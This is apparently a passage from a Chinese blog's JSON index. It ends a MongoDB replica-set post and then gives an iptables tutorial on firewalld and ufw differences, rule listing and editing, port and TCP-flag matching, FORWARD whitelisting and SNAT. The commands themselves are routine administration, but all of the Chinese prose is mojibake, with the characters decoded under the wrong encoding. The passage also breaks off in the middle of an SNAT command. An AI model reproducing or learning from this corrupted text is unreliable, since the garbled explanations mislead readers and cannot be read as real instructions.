åˆ¤æ–­æ˜¯ä¸æ˜¯master: db.isMaster()\n  2. å¤åˆ¶é›†çŠ¶æ€æŸ¥è¯¢ï¼šrs.status()\n  3. æŸ¥çœ‹oplogçŠ¶æ€ï¼š rs.printReplicationInfo()\n  4. æŸ¥çœ‹å¤åˆ¶å»¶è¿Ÿï¼šÂ  rs.printSlaveReplicationInfo()\n  5. æŸ¥çœ‹æœåŠ¡çŠ¶æ€è¯¦æƒ…:Â Â  db.serverStatus()\n  ```\n  \n  \n\n\n# 4. é—®é¢˜æ€»ç»“\n\n+ docker å†…æ²¡æœ‰å‘½ä»¤\n\n  ```bash\n  apt update\n  apt install vim #vim\n  apt install procps # ps\n  apt install iputils-ping #ping\n  ```\n\n  \n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/50597960\n+ https://outmanzzq.github.io/2019/01/30/docker-mongo-replica/","tags":["sql"],"categories":["æ•°æ®åº“"]},{"title":"iptablesä½¿ç”¨æ•™ç¨‹03","url":"%2Fp%2F354a6a3b.html","content":"\n\n\n# 10. é˜²ç«å¢™å…³ç³»\n\n### 10.1 firewalld å’Œ iptables å…³ç³»(Centos)\n\nConterOS7.0ä»¥ä¸Šä½¿ç”¨çš„æ˜¯firewallï¼ŒConterOS7.0ä»¥ä¸‹ä½¿ç”¨çš„æ˜¯iptables\n\n<!-- more -->\n\nåœ¨RHEL7é‡Œæœ‰å‡ ç§é˜²ç«å¢™å…±å­˜ï¼šfirewalldã€iptablesã€ebtablesï¼Œé»˜è®¤æ˜¯ä½¿ç”¨firewalldæ¥ç®¡ç†netfilterå­ç³»ç»Ÿï¼Œä¸è¿‡åº•å±‚è°ƒç”¨çš„å‘½ä»¤ä»ç„¶æ˜¯iptablesç­‰ã€‚\n\nfirewalldè·Ÿiptablesæ¯”èµ·æ¥è‡³å°‘æœ‰ä¸¤å¤§å¥½å¤„ï¼š\n\n1ã€firewalldå¯ä»¥åŠ¨æ€ä¿®æ”¹å•æ¡è§„åˆ™ï¼Œè€Œä¸éœ€è¦åƒiptablesé‚£æ ·ï¼Œåœ¨ä¿®æ”¹äº†è§„åˆ™åå¿…é¡»å¾—å…¨éƒ¨åˆ·æ–°æ‰å¯ä»¥ç”Ÿæ•ˆï¼›\n\n2ã€firewalldåœ¨ä½¿ç”¨ä¸Šè¦æ¯”iptablesäººæ€§åŒ–å¾ˆå¤šï¼Œå³ä½¿ä¸æ˜ç™½â€œäº”å¼ è¡¨äº”æ¡é“¾â€è€Œä¸”å¯¹TCP/IPåè®®ä¹Ÿä¸ç†è§£ä¹Ÿå¯ä»¥å®ç°å¤§éƒ¨åˆ†åŠŸèƒ½ã€‚\n\nfirewalldè·Ÿiptablesæ¯”èµ·æ¥ï¼Œä¸å¥½çš„åœ°æ–¹æ˜¯æ¯ä¸ªæœåŠ¡éƒ½éœ€è¦å»è®¾ç½®æ‰èƒ½æ”¾è¡Œï¼Œå› ä¸ºé»˜è®¤æ˜¯æ‹’ç»ã€‚è€Œiptablesé‡Œé»˜è®¤æ˜¯æ¯ä¸ªæœåŠ¡æ˜¯å…è®¸ï¼Œéœ€è¦æ‹’ç»çš„æ‰å»é™åˆ¶ã€‚\n\n\n\n### 10.2 ufw å’Œ iptables å…³ç³»(Ubuntu)\n\nUncomplicated Firewallï¼Œç®€ç§° UFWï¼Œæ˜¯Ubuntuç³»ç»Ÿä¸Šé»˜è®¤çš„é˜²ç«å¢™ç»„ä»¶ã€‚UFWæ˜¯ä¸ºè½»é‡åŒ–é…ç½®iptablesè€Œå¼€å‘çš„ä¸€æ¬¾å·¥å…·ã€‚UFW æä¾›ä¸€ä¸ªéå¸¸å‹å¥½çš„ç•Œé¢ç”¨äºåˆ›å»ºåŸºäºIPV4ï¼ŒIPV6çš„é˜²ç«å¢™è§„åˆ™ã€‚UFW åœ¨ Ubuntu 8.04 LTS åçš„æ‰€æœ‰å‘è¡Œç‰ˆä¸­é»˜è®¤å¯ç”¨ã€‚\n\nå½“ä½¿ç”¨äº† ufw è¿™ç±»å‰ç«¯æ—¶ï¼Œå°±æœ€å¥½ä¸è¦å†ç¢° iptables äº†ï¼Œå°¤å…¶è¦æ…é‡ä½¿ç”¨ iptables â€“ æ¥æ¸…ç©ºæ‰€æœ‰é“¾çš„è§„åˆ™ã€‚åœ¨ä¸äº†è§£ iptables çš„è¡¨ã€é“¾ã€è§„åˆ™ä¹‹å‰ï¼Œç›²ç›®çš„æ¸…ç©º iptablesâ€è§„åˆ™â€ å°±æ˜¯è€æµæ°“ï¼\n\nè¯•æƒ³ï¼Œå‡å¦‚ä½ åœ¨æœåŠ¡å™¨ä¸Šufw enableï¼Œé‚£ä¹ˆ INPUT å’Œ FORWARD å°±æ˜¯ DROPï¼Œé‚£ä¹ˆå½“ä½ iptables -Fæ—¶ï¼Œä¸ä»…ä»…æ˜¯ SSH çš„ä¾‹å¤–è§„åˆ™æ²¡äº†ï¼Œæ‰€æœ‰å‡ºç½‘çš„åŒ…ä¹Ÿéƒ½å‡ºä¸å»äº†ï¼æ­¤æ—¶å”¯ä¸€èƒ½åšçš„äº‹æƒ…å°±æ˜¯å» VNCã€æˆ–è€…å»æœºæˆ¿æ’é¼ æ ‡é”®ç›˜æ˜¾ç¤ºå™¨ã€‚\n\n\n\n### 10.3 è™šæ‹Ÿé˜²ç«å¢™å’Œå®‰å…¨ç»„æœ‰ä»€ä¹ˆå·®å¼‚\n\n+ äº‘è™šæ‹Ÿé˜²ç«å¢™æ˜¯äº’è”ç½‘è¾¹ç•Œé˜²ç«å¢™ã€VPCè¾¹ç•Œé˜²ç«å¢™ã€ä¸»æœºè¾¹ç•Œé˜²ç«å¢™çš„ç»Ÿç§°ï¼Œä¸ºæ‚¨æä¾›äº’è”ç½‘è¾¹ç•Œã€VPCç½‘ç»œè¾¹ç•Œã€ECSå®ä¾‹é—´çš„ä¸‰é‡é˜²æŠ¤ã€‚\n\n+ å®‰å…¨ç»„æ˜¯ECSæä¾›çš„è™šæ‹Ÿä¸»æœºé˜²ç«å¢™ï¼Œå¯¹ECSå®ä¾‹é—´çš„æµé‡è¿›è¡Œè®¿é—®æ§åˆ¶ã€‚\n\nç»“è®º: \n\n1. é˜²ç«å¢™æ˜¯åœ¨å®‰å…¨ç»„ä¹‹å‰ç”Ÿæ•ˆçš„ã€‚\n\n2. é˜²ç«å¢™ä¸»è¦æ˜¯åšå—åŒ—å‘çš„è®¿é—®æ§åˆ¶ï¼Œä½œç”¨èŒƒå›´æ˜¯æ•´ä¸ªVPCï¼Œå®‰å…¨ç»„ä¸»è¦æ˜¯åšä¸œè¥¿å‘çš„è®¿é—®æ§åˆ¶ï¼Œä½œç”¨èŒƒå›´æ˜¯è™šæ‹Ÿæœºç½‘å¡ï¼Œå’Œé˜²ç«å¢™å½¢æˆäº’è¡¥çš„å…³ç³»ã€‚\n\n![1](iptablesä½¿ç”¨æ•™ç¨‹03/99.png)\n\n\n\n\n\n# 11. å‘½ä»¤æ€»ç»“\n\n### 11.1 è¿‡æ»¤æŸ¥çœ‹\n\n```bash\n#æŸ¥çœ‹å¯¹åº”è¡¨çš„æ‰€æœ‰è§„åˆ™ï¼Œ-té€‰é¡¹æŒ‡å®šè¦æ“ä½œçš„è¡¨ï¼Œçœç•¥\"-t è¡¨å\"æ—¶ï¼Œé»˜è®¤è¡¨ç¤ºæ“ä½œfilterè¡¨ï¼Œ-Lè¡¨ç¤ºåˆ—å‡ºè§„åˆ™ï¼Œå³æŸ¥çœ‹è§„åˆ™\niptablesÂ -tÂ è¡¨åÂ -L\n\n\n#æŸ¥çœ‹æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾ä¸­çš„è§„åˆ™\niptables -t è¡¨å -L é“¾å\n\n\n\n# æŸ¥çœ‹æŒ‡å®šè¡¨çš„æ‰€æœ‰è§„åˆ™ï¼Œå¹¶ä¸”æ˜¾ç¤ºæ›´è¯¦ç»†çš„ä¿¡æ¯ï¼ˆæ›´å¤šå­—æ®µï¼‰ï¼Œ-vè¡¨ç¤ºverboseï¼Œè¡¨ç¤ºè¯¦ç»†çš„ï¼Œå†—é•¿çš„ï¼Œå½“ä½¿ç”¨-vé€‰é¡¹æ—¶ï¼Œä¼šæ˜¾ç¤ºå‡º\"è®¡æ•°å™¨\"çš„ä¿¡æ¯ï¼Œç”±äºä¸Šä¾‹ä¸­ä½¿ç”¨çš„é€‰é¡¹éƒ½æ˜¯çŸ­é€‰é¡¹ï¼Œæ‰€ä»¥ä¸€èˆ¬ç®€å†™ä¸ºiptables -t è¡¨å -vL\niptablesÂ -tÂ è¡¨åÂ -vÂ -L\n\n\n\n#è¡¨ç¤ºæŸ¥çœ‹è¡¨çš„æ‰€æœ‰è§„åˆ™ï¼Œå¹¶ä¸”åœ¨æ˜¾ç¤ºè§„åˆ™æ—¶ï¼Œä¸å¯¹è§„åˆ™ä¸­çš„IPæˆ–è€…ç«¯å£è¿›è¡Œåç§°åè§£ï¼Œ-né€‰é¡¹è¡¨ç¤ºä¸è§£æIPåœ°å€ã€‚\niptablesÂ -tÂ è¡¨åÂ -nÂ -L\n\n\n#è¡¨ç¤ºæŸ¥çœ‹è¡¨çš„æ‰€æœ‰è§„åˆ™ï¼Œå¹¶ä¸”æ˜¾ç¤ºè§„åˆ™çš„åºå·ï¼Œ--line-numbersé€‰é¡¹è¡¨ç¤ºæ˜¾ç¤ºè§„åˆ™çš„åºå·ï¼Œæ³¨æ„ï¼Œæ­¤é€‰é¡¹ä¸ºé•¿é€‰é¡¹ï¼Œä¸èƒ½ä¸å…¶ä»–çŸ­é€‰é¡¹åˆå¹¶ï¼Œä¸è¿‡æ­¤é€‰é¡¹å¯ä»¥ç®€å†™ä¸º--lineï¼Œæ³¨æ„ï¼Œç®€å†™åä»ç„¶æ˜¯ä¸¤æ¡æ¨ªæ ï¼Œä»ç„¶æ˜¯é•¿é€‰é¡¹ã€‚\niptablesÂ --line-numbersÂ -tÂ è¡¨åÂ -L\n\n\n#è¡¨ç¤ºæŸ¥çœ‹è¡¨ä¸­çš„æ‰€æœ‰è§„åˆ™ï¼Œå¹¶ä¸”æ˜¾ç¤ºæ›´è¯¦ç»†çš„ä¿¡æ¯(-vé€‰é¡¹)ï¼Œä¸è¿‡ï¼Œè®¡æ•°å™¨ä¸­çš„ä¿¡æ¯æ˜¾ç¤ºä¸ºç²¾ç¡®çš„è®¡æ•°å€¼ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºä¸ºç»è¿‡å¯è¯»ä¼˜åŒ–çš„è®¡æ•°å€¼ï¼Œ-xé€‰é¡¹è¡¨ç¤ºæ˜¾ç¤ºè®¡æ•°å™¨çš„ç²¾ç¡®å€¼ã€‚\niptablesÂ -tÂ è¡¨åÂ -vÂ -xÂ -L\n\n\n# å®é™…ä½¿ç”¨ä¸­ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œå¾€å¾€ä¼šå°†çŸ­é€‰é¡¹è¿›è¡Œåˆå¹¶ï¼Œæ‰€ä»¥ï¼Œå¦‚æœå°†ä¸Šè¿°é€‰é¡¹éƒ½ç³…åˆåœ¨ä¸€èµ·ï¼Œå¯ä»¥å†™æˆå¦‚ä¸‹å‘½ä»¤ï¼Œæ­¤å¤„ä»¥filterè¡¨ä¸ºä¾‹ã€‚\niptablesÂ --lineÂ -tÂ filterÂ -nvxLÂ INPUT\n```\n\n\n\n### 11.2 è¿‡æ»¤å¢åˆ å­˜\n\n+ å¢åŠ \n\n```bash\n#åœ¨æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„å°¾éƒ¨æ·»åŠ ä¸€æ¡è§„åˆ™ï¼Œ-Aé€‰é¡¹è¡¨ç¤ºåœ¨å¯¹åº”é“¾çš„æœ«å°¾æ·»åŠ è§„åˆ™ï¼Œçœç•¥-té€‰é¡¹æ—¶ï¼Œè¡¨ç¤ºé»˜è®¤æ“ä½œfilterè¡¨ä¸­çš„è§„åˆ™\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -AÂ é“¾åÂ åŒ¹é…æ¡ä»¶Â -jÂ åŠ¨ä½œ\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -AÂ INPUTÂ -sÂ 192.168.1.146Â -jÂ DROP\n\n\n#åœ¨æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„é¦–éƒ¨æ·»åŠ ä¸€æ¡è§„åˆ™ï¼Œ-Ié€‰å‹è¡¨ç¤ºåœ¨å¯¹åº”é“¾çš„å¼€å¤´æ·»åŠ è§„åˆ™\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -IÂ é“¾åÂ åŒ¹é…æ¡ä»¶Â -jÂ åŠ¨ä½œ\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -jÂ ACCEPT\n\n\n#åœ¨æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„æŒ‡å®šä½ç½®æ·»åŠ ä¸€æ¡è§„åˆ™\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -IÂ é“¾åÂ è§„åˆ™åºå·Â åŒ¹é…æ¡ä»¶Â -jÂ åŠ¨ä½œ\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -IÂ INPUTÂ 5Â -sÂ 192.168.1.146Â -jÂ REJECT\n\n\n#è®¾ç½®æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„é»˜è®¤ç­–ç•¥ï¼ˆé»˜è®¤åŠ¨ä½œï¼‰ï¼Œå¹¶éæ·»åŠ è§„åˆ™ã€‚\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -PÂ é“¾åÂ åŠ¨ä½œ\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -PÂ FORWARDÂ ACCEPT\n```\n\n+ åˆ é™¤\n\n```bash\n#æŒ‰ç…§è§„åˆ™åºå·åˆ é™¤è§„åˆ™ï¼Œåˆ é™¤æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„æŒ‡å®šè§„åˆ™ï¼Œ-Dé€‰é¡¹è¡¨ç¤ºåˆ é™¤å¯¹åº”é“¾ä¸­çš„è§„åˆ™ã€‚\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -DÂ é“¾åÂ è§„åˆ™åºå·\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -DÂ INPUTÂ 3\n\n\n#æŒ‰ç…§å…·ä½“çš„åŒ¹é…æ¡ä»¶ä¸åŠ¨ä½œåˆ é™¤è§„åˆ™ï¼Œåˆ é™¤æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„æŒ‡å®šè§„åˆ™ã€‚\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -DÂ é“¾åÂ åŒ¹é…æ¡ä»¶Â -jÂ åŠ¨ä½œ\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -DÂ INPUTÂ -sÂ 192.168.1.146Â -jÂ DROP\n\n\n#åˆ é™¤æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾ä¸­çš„æ‰€æœ‰è§„åˆ™ï¼Œ-Fé€‰é¡¹è¡¨ç¤ºæ¸…ç©ºå¯¹åº”é“¾ä¸­çš„è§„åˆ™ï¼Œæ‰§è¡Œæ—¶éœ€ä¸‰æ€ã€‚\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -FÂ é“¾å\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -FÂ INPUT\n\n#åˆ é™¤æŒ‡å®šè¡¨ä¸­çš„æ‰€æœ‰è§„åˆ™ï¼Œæ‰§è¡Œæ—¶éœ€ä¸‰æ€ã€‚\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -F\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -F\n```\n\n+ ä¿®æ”¹\n\n```bash\n#ä¿®æ”¹æŒ‡å®šè¡¨ä¸­æŒ‡å®šé“¾çš„æŒ‡å®šè§„åˆ™ï¼Œ-Ré€‰é¡¹è¡¨ç¤ºä¿®æ”¹å¯¹åº”é“¾ä¸­çš„è§„åˆ™ï¼Œä½¿ç”¨-Ré€‰é¡¹æ—¶è¦åŒæ—¶æŒ‡å®šå¯¹åº”çš„é“¾ä»¥åŠè§„åˆ™å¯¹åº”çš„åºå·ï¼Œå¹¶ä¸”è§„åˆ™ä¸­åŸæœ¬çš„åŒ¹é…æ¡ä»¶ä¸å¯çœç•¥ã€‚\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -RÂ é“¾åÂ è§„åˆ™åºå·Â è§„åˆ™åŸæœ¬çš„åŒ¹é…æ¡ä»¶Â -jÂ åŠ¨ä½œ\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -RÂ INPUTÂ 3Â -sÂ 192.168.1.146Â -jÂ ACCEPT\n\n\n#å…¶ä»–ä¿®æ”¹è§„åˆ™çš„æ–¹æ³•ï¼šå…ˆé€šè¿‡ç¼–å·åˆ é™¤è§„åˆ™ï¼Œå†åœ¨åŸç¼–å·ä½ç½®æ·»åŠ ä¸€æ¡è§„åˆ™ã€‚\n\n\n#ä¿®æ”¹æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„é»˜è®¤ç­–ç•¥ï¼ˆé»˜è®¤åŠ¨ä½œï¼‰ï¼Œå¹¶éä¿®æ”¹è§„åˆ™ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ã€‚\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -PÂ é“¾åÂ åŠ¨ä½œ\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -PÂ FORWARDÂ ACCEPT\n```\n+ ä¿å­˜\n\n```bash\n# centos\nyum install -y iptables-services\nsystemctl disable firewalld\nsystemctl enable iptables\nservice iptables save\n\n# ubtuntu\nsudo apt-get install iptables-persistent\nsudo netfilter-persistent save\nsudo netfilter-persistent reload\n```\n\n\n\n### 11.3 åè®®, ç½‘å¡åŒ¹é…\n\n-pç”¨äºåŒ¹é…æŠ¥æ–‡çš„åè®®ç±»å‹,å¯ä»¥åŒ¹é…çš„åè®®ç±»å‹tcpã€udpã€udpliteã€icmpã€espã€ahã€sctpç­‰ï¼ˆcentos7ä¸­è¿˜æ”¯æŒicmpv6ã€mhï¼‰ã€‚\n\n```Â bash\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ tcpÂ -sÂ 192.168.1.146Â -jÂ ACCEPT\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ !Â -pÂ udpÂ -sÂ 192.168.1.146Â -jÂ ACCEPT\n```\n\n\n\n-iç”¨äºåŒ¹é…æŠ¥æ–‡æ˜¯ä»å“ªä¸ªç½‘å¡æ¥å£æµå…¥æœ¬æœºçš„ï¼Œç”±äºåŒ¹é…æ¡ä»¶åªæ˜¯ç”¨äºåŒ¹é…æŠ¥æ–‡æµå…¥çš„ç½‘å¡ï¼Œæ‰€ä»¥åœ¨OUTPUTé“¾ä¸POSTROUTINGé“¾ä¸­ä¸èƒ½ä½¿ç”¨æ­¤é€‰é¡¹ã€‚\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ icmpÂ -iÂ eth4Â -jÂ DROP\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ icmpÂ !Â -iÂ eth4Â -jÂ DROP\n```\n\n-oç”¨äºåŒ¹é…æŠ¥æ–‡å°†è¦ä»å“ªä¸ªç½‘å¡æ¥å£æµå‡ºæœ¬æœºï¼ŒäºåŒ¹é…æ¡ä»¶åªæ˜¯ç”¨äºåŒ¹é…æŠ¥æ–‡æµå‡ºçš„ç½‘å¡ï¼Œæ‰€ä»¥åœ¨INPUTé“¾ä¸PREROUTINGé“¾ä¸­ä¸èƒ½ä½¿ç”¨æ­¤é€‰é¡¹ã€‚\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ icmpÂ -oÂ eth4Â -jÂ DROP\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ icmpÂ !Â -oÂ eth4Â -jÂ DROP\n```\n\n\n\n### 11.4 IPåŒ¹é…\n\n-sç”¨äºåŒ¹é…æŠ¥æ–‡çš„æºåœ°å€,å¯ä»¥åŒæ—¶æŒ‡å®šå¤šä¸ªæºåœ°å€ï¼Œæ¯ä¸ªIPä¹‹é—´ç”¨é€—å·éš”å¼€ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸ºä¸€ä¸ªç½‘æ®µã€‚\n\n```bash\niptables -t filter -I INPUT -s 192.168.1.111,192.168.1.118 -j DROP\niptables -t filter -I INPUT -s 192.168.1.0/24 -j ACCEPT\niptables -t filter -I INPUT ! -s 192.168.1.0/24 -j ACCEPT\n```\n\n-dç”¨äºåŒ¹é…æŠ¥æ–‡çš„ç›®æ ‡åœ°å€,å¯ä»¥åŒæ—¶æŒ‡å®šå¤šä¸ªç›®æ ‡åœ°å€ï¼Œæ¯ä¸ªIPä¹‹é—´ç”¨é€—å·éš”å¼€ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸ºä¸€ä¸ªç½‘æ®µã€‚\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -dÂ 192.168.1.111,192.168.1.118Â -jÂ DROP\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -dÂ 192.168.1.0/24Â -jÂ ACCEPT\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ !Â -dÂ 192.168.1.0/24Â -jÂ ACCEPT\n```\n\n\n\n### 11.5 ç«¯å£åŒ¹é…\n\n+ tcpæ‰©å±•æ¨¡å—\n\n  -p tcp -m tcp --sport ç”¨äºåŒ¹é…tcpåè®®æŠ¥æ–‡çš„æºç«¯å£ï¼Œå¯ä»¥ä½¿ç”¨å†’å·æŒ‡å®šä¸€ä¸ªè¿ç»­çš„ç«¯å£èŒƒå›´\n\n  -p tcp -m tcp --dport ç”¨äºåŒ¹é…tcpåè®®æŠ¥æ–‡çš„ç›®æ ‡ç«¯å£ï¼Œå¯ä»¥ä½¿ç”¨å†’å·æŒ‡å®šä¸€ä¸ªè¿ç»­çš„ç«¯å£èŒƒå›´\n\n  ```bash\n  iptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -dÂ 192.168.1.146Â -pÂ tcpÂ -mÂ tcpÂ --sportÂ 22Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -pÂ tcpÂ -mÂ tcpÂ --dportÂ 22:25Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -pÂ tcpÂ -mÂ tcpÂ --dportÂ :22Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -pÂ tcpÂ -mÂ tcpÂ --dportÂ 80:Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -dÂ 192.168.1.146Â -pÂ tcpÂ -mÂ tcpÂ !Â --sportÂ 22Â -jÂ ACCEPT\n  ```\n\n  \n\n+ multiportæ‰©å±•æ¨¡å—\n\n  -p tcp -m multiport --sports ç”¨äºåŒ¹é…æŠ¥æ–‡çš„æºç«¯å£ï¼Œå¯ä»¥æŒ‡å®šç¦»æ•£çš„å¤šä¸ªç«¯å£å·,ç«¯å£ä¹‹é—´ç”¨\"é€—å·\"éš”å¼€\n\n  -p udp -m multiport --dports ç”¨äºåŒ¹é…æŠ¥æ–‡çš„ç›®æ ‡ç«¯å£ï¼Œå¯ä»¥æŒ‡å®šç¦»æ•£çš„å¤šä¸ªç«¯å£å·ï¼Œç«¯å£ä¹‹é—´ç”¨\"é€—å·\"éš”å¼€\n\n  ```bash\n  iptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -dÂ 192.168.1.146Â -pÂ udpÂ -mÂ multiportÂ --sportsÂ 137,138Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -pÂ tcpÂ -mÂ multiportÂ --dportsÂ 22,80Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -pÂ tcpÂ -mÂ multiportÂ !Â --dportsÂ 22,80Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -pÂ tcpÂ -mÂ multiportÂ --dportsÂ 80:88Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -pÂ tcpÂ -mÂ multiportÂ --dportsÂ 22,80:88Â -jÂ REJECT\n  ```\n  \n  \n\n### 11.6 tcpå¤´æ ‡å¿—ä½åŒ¹é…\n\n```bash\n#ç¬¬ä¸€æ¬¡æ¡æ‰‹\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ tcpÂ -mÂ tcpÂ --dportÂ 22Â --tcp-flagsÂ SYN,ACK,FIN,RST,URG,PSHÂ SYNÂ -jÂ REJECT\n#ç¬¬äºŒæ¬¡æ¡æ‰‹\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ -mÂ tcpÂ --sportÂ 22Â --tcp-flagsÂ SYN,ACK,FIN,RST,URG,PSHÂ SYN,ACKÂ -jÂ REJECT\n#ç¬¬ä¸€æ¬¡æ¡æ‰‹\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ tcpÂ -mÂ tcpÂ --dportÂ 22Â --tcp-flagsÂ ALLÂ SYNÂ -jÂ REJECT\n#ç¬¬äºŒæ¬¡æ¡æ‰‹\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ -mÂ tcpÂ --sportÂ 22Â --tcp-flagsÂ ALLÂ SYN,ACKÂ -jÂ REJECT\n\n#ç”¨äºåŒ¹é…tcpæ–°å»ºè¿æ¥çš„è¯·æ±‚æŠ¥æ–‡,\"ç¬¬ä¸€æ¬¡æ¡æ‰‹\"\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ tcpÂ -mÂ tcpÂ --dportÂ 22Â --synÂ -jÂ REJECT\n```\n\n\n\n### 11.7 ç½‘ç»œé˜²ç«å¢™(filterè¡¨forwardé“¾)\n\nç”±äºiptablesæ­¤æ—¶çš„è§’è‰²ä¸º\"ç½‘ç»œé˜²ç«å¢™\"ï¼Œæ‰€ä»¥éœ€è¦åœ¨filterè¡¨ä¸­çš„FORWARDé“¾ä¸­è®¾ç½®è§„åˆ™ã€‚\nå¯ä»¥ä½¿ç”¨\"ç™½åå•æœºåˆ¶\"ï¼Œå…ˆæ·»åŠ ä¸€æ¡é»˜è®¤æ‹’ç»çš„è§„åˆ™ï¼Œç„¶åå†ä¸ºéœ€è¦æ”¾è¡Œçš„æŠ¥æ–‡è®¾ç½®è§„åˆ™ã€‚\né…ç½®è§„åˆ™æ—¶éœ€è¦è€ƒè™‘\"æ–¹å‘é—®é¢˜\"ï¼Œé’ˆå¯¹è¯·æ±‚æŠ¥æ–‡ä¸å›åº”æŠ¥æ–‡ï¼Œè€ƒè™‘æŠ¥æ–‡çš„æºåœ°å€ä¸ç›®æ ‡åœ°å€ï¼Œæºç«¯å£ä¸ç›®æ ‡ç«¯å£ç­‰ã€‚\n\n```bash\n#ç¤ºä¾‹ä¸ºå…è®¸ç½‘ç»œå†…ä¸»æœºè®¿é—®ç½‘ç»œå¤–ä¸»æœºçš„webæœåŠ¡ä¸sshdæœåŠ¡ã€‚\niptablesÂ -AÂ FORWARDÂ -jÂ REJECT\niptablesÂ -IÂ FORWARDÂ -sÂ 10.1.0.0/16Â -pÂ tcpÂ --dportÂ 80Â -jÂ ACCEPT\niptablesÂ -IÂ FORWARDÂ -dÂ 10.1.0.0/16Â -pÂ tcpÂ --sportÂ 80Â -jÂ ACCEPT\niptablesÂ -IÂ FORWARDÂ -sÂ 10.1.0.0/16Â -pÂ tcpÂ --dportÂ 22Â -jÂ ACCEPT\niptablesÂ -IÂ FORWARDÂ -dÂ 10.1.0.0/16Â -pÂ tcpÂ --sportÂ 22Â -jÂ ACCEPT\n```\n\n\n\nå¯ä»¥ä½¿ç”¨stateæ‰©å±•æ¨¡å—ï¼Œå¯¹ä¸Šè¿°è§„åˆ™è¿›è¡Œä¼˜åŒ–ï¼Œä½¿ç”¨å¦‚ä¸‹é…ç½®å¯ä»¥çœç•¥è®¸å¤š\"å›åº”æŠ¥æ–‡æ”¾è¡Œè§„åˆ™\"ã€‚\n\n```bash\niptablesÂ -AÂ FORWARDÂ -jÂ REJECT\niptablesÂ -IÂ FORWARDÂ -sÂ 10.1.0.0/16Â -pÂ tcpÂ --dportÂ 80Â -jÂ ACCEPT\niptablesÂ -IÂ FORWARDÂ -sÂ 10.1.0.0/16Â -pÂ tcpÂ --dportÂ 22Â -jÂ ACCEPT\niptablesÂ -IÂ FORWARDÂ -mÂ stateÂ --stateÂ ESTABLISHED,RELATEDÂ -jÂ ACCEPT\n```\n\n\n\n### 11.8 SNATå†…ç½‘å¤–å‡º(natè¡¨postroutingé“¾)\n\n```bash\niptablesÂ -tÂ natÂ -AÂ POSTROUTINGÂ -sÂ 10.1.0.0/16Â -jÂ SNATÂ --to-sourceÂ å…¬ç½‘IP\niptablesÂ -tÂ natÂ -AÂ POSTROUTINGÂ -sÂ 